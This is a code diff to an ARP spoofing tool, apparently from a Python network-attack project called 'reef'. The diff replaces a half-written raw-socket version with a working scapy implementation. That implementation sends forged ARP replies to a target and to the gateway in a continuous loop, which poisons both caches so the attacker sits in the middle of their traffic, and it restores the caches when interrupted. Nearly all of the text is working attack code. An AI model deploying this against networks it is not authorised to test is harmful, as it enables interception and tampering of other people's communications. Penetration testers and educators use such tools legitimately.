@@ -1,7 +1,6 @@
-import socket
-import struct
-import binascii
-from uuid import getnode
+import scapy.all as scapy
+from reef.utils import get_gateway, get_mac
+import time
 
 
 class ArpSpoofer:
@@ -10,25 +9,41 @@ class ArpSpoofer:
 
     """
 
-    def __init__(self, target, gateway):
-        """
-        target => target ip
-        gateway => gateway ip
-        mac => system mac address
-
-        """
-        self.mac = ":".join(("%012X" % getnode())[i : i + 2] for i in range(0, 12, 2))
+    def __init__(self, target, spoof_ip, g_mac):
         self.target = target
-        self.gateway = gateway
+        self.spoof_ip = spoof_ip
+        self.gateway = get_gateway()
+        self.t_mac = get_mac(self.target)
+        self.g_mac = g_mac
 
-    def spoof(self):
+    def spoof(self, target, target_mac, spoof) -> None:
+        pkt = scapy.ARP(op=2, pdst=target, hwdst=target_mac, psrc=spoof)
+        scapy.send(pkt, verbose=True)
 
-        code = "\x08\x06"
-        htype = "\x00\x01"
-        protype = "\x08\x00"
-        hsize = "\x06"
-        psize = "\x04"
-        opcode = "\x00\x02"
+    def restore(self, destination_ip, d_mac, source_ip, s_mac) -> None:
+        destination_mac = d_mac
+        source_mac = s_mac
+        pkt = scapy.ARP(
+            op=2,
+            pdst=destination_ip,
+            hwdst=destination_mac,
+            psrc=source_ip,
+            hwsrc=source_mac,
+        )
 
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.htons(0x0800))
-        s.bind(("eth0", socket.htons(0x0800)))
+        scapy.send(pkt, verbose=False)
+
+    def execute(self) -> None:
+        try:
+            spc = 0
+            while True:
+                self.spoof(self.target, self.t_mac, self.gateway)
+                self.spoof(self.gateway, self.g_mac, self.target)
+                spc += 2
+                print(f"[*] Packets Sent {spc}")
+                time.sleep(2)
+
+        except KeyboardInterrupt:
+            print("Restoring")
+            self.restore(self.gateway, self.g_mac, self.target, self.t_mac)
+            self.restore(self.target, self.t_mac, self.gateway, self.g_mac)
